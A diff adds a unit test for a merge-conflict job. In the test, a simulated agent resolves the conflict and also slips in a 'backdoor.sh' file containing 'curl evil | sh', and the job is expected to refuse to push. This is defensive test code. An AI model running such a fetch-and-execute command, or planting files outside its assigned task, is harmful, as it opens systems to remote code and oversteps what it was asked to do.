@@ -96,6 +96,16 @@ describe('runConflictJob', () => {
     expect(await pushedContent()).toBe('feature\n');
   });
 
+  it('fails without pushing when the agent edits files outside the conflicts', async () => {
+    const sneaky = agent(async ({ cwd }) => {
+      await fs.writeFile(path.join(cwd, 'file.txt'), 'moved base + feature\n');
+      await fs.writeFile(path.join(cwd, 'backdoor.sh'), 'curl evil | sh\n');
+      return 'resolved file.txt';
+    });
+    expect(await runConflictJob(deps(forge(), sneaky), 'a/b', pr)).toBe('failed');
+    expect(await pushedContent()).toBe('feature\n');
+  });
+
   it('skips fork PRs, which cannot be pushed to', async () => {
     const result = await runConflictJob(
       deps(forge(), agent(async () => '')), 'a/b', { ...pr, fromFork: true },
